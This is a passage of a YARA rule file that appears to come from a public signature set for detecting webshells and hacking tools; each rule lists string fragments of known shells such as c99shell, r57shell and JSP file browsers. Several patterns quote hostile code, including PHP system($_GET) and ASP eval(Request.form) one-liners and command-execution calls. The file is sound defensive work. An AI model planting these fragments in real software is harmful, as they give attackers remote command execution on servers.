		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8697-L8708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"

	condition:
		all of them
}

rule SIGNATURE_BASE_C99Shell
{
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8709-L8720"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		logic_hash = "a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpspy_2005_Full
{
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8721-L8732"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d1c69bb152645438440e6c903bac16b2"
		logic_hash = "8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_2
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8733-L8744"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_2
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8745-L8756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8757-L8770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"

	condition:
		all of them
}

rule SIGNATURE_BASE__Root_040_Zip_Folder_Deploy
{
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8771-L8784"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		logic_hash = "9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}

rule SIGNATURE_BASE_By063Cli
{
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8785-L8797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		logic_hash = "c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."

	condition:
		all of them
}

rule SIGNATURE_BASE_Icyfox007V1_10_Rar_Folder_Asp
{
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8798-L8809"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		logic_hash = "3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_2
{
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8811-L8822"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		logic_hash = "25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"

	condition:
		all of them
}

rule SIGNATURE_BASE_U_Uay
{
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8823-L8835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		logic_hash = "45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Bin_Wuaus
{
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8836-L8852"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		logic_hash = "0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="

	condition:
		all of them
}

rule SIGNATURE_BASE_Pwreveal
{
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8853-L8867"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		logic_hash = "01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Xwhois
{
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8868-L8882"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		logic_hash = "75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_2
{
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8883-L8894"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		logic_hash = "428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Vanquish - DLL injection failed:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Down_Rar_Folder_Down
{
	meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8895-L8906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "db47d7a12b3584a2e340567178886e71"
		logic_hash = "bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cmdshell
{
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8907-L8918"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		logic_hash = "5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Nc
{
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8919-L8933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		logic_hash = "6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portlessinst
{
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8934-L8947"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		logic_hash = "72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Setupbdoor
{
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8948-L8959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "41f89e20398368e742eda4a3b45716b6"
		logic_hash = "b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\SetupBDoor"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_3
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8960-L8972"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		logic_hash = "b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Server
{
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8973-L8989"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		logic_hash = "34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006
{
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8990-L9001"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		logic_hash = "536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "strBackDoor = strBackDoor "

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_3
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9002-L9013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		logic_hash = "0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<b>\".$_POST['cmd']"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hdconfig
{
	meta:
		description = "Webshells Auto-generated - file HDConfig.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6f743137-e85a-5298-b51e-c8792e507d28"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9014-L9029"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7d60e552fdca57642fd30462416347bd"
		logic_hash = "9001f79db15548cf3ca931d0043d078db7d900ab26093afbf5cd44d0a85800f4"
		score = 60
		quality = 55
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "An encryption key is derived from the password hash. "
		$s3 = "A hash object has been created. "
		$s4 = "Error during CryptCreateHash!"
		$s5 = "A new key container has been created."
		$s6 = "The password has been added to the hash. "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan_2
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9030-L9042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"

	condition:
		all of them
}

rule SIGNATURE_BASE_JSP_Browser_APT_Webshell
{
	meta:
		description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
		author = "Florian Roth (Nextron Systems)"
		id = "06988b5b-ec8b-5a10-b659-3e846057ea51"
		date = "2014-10-10"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9061-L9075"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a352bf394f1b4f70218650758db39225a5a505656299405ccd077592d29480a7"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
		$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
		$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
		$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_JSP_Jfigueiredo_APT_Webshell
{
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		id = "b5080e43-44e2-54fa-b03a-057dc75d14db"
		date = "2014-12-10"
		modified = "2025-03-29"
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9077-L9090"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7efaca469d09ce7ecba4ed38cb0b07d1b9fc4f45172d2ffb6f5d3259c000fdc5"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
		$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_JSP_Jfigueiredo_APT_Webshell_2
{
	meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		id = "91575627-78c1-5ca1-8180-cc4004df88e8"
		date = "2014-12-10"
		modified = "2025-03-29"
